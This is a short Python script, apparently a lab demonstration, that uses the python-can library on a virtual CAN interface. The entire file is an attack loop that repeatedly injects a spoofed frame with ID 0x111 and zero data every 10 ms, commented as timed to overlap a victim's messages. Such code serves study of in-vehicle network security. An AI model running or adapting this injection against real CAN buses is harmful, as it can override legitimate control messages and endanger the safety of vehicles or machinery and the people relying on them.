import can
import time

bus = can.interface.Bus(interface='socketcan', channel='vcan0')

attack_msg = can.Message(arbitration_id=0x111, data=[0x00, 0x00], is_extended_id=False, is_rx=False)
try:
    while True:
        bus.send(attack_msg)
        print(f"Attacker sent: {attack_msg}")
        time.sleep(0.01)  # Send message timed to overlap victim
except KeyboardInterrupt:
    print("Attacker stopped.")
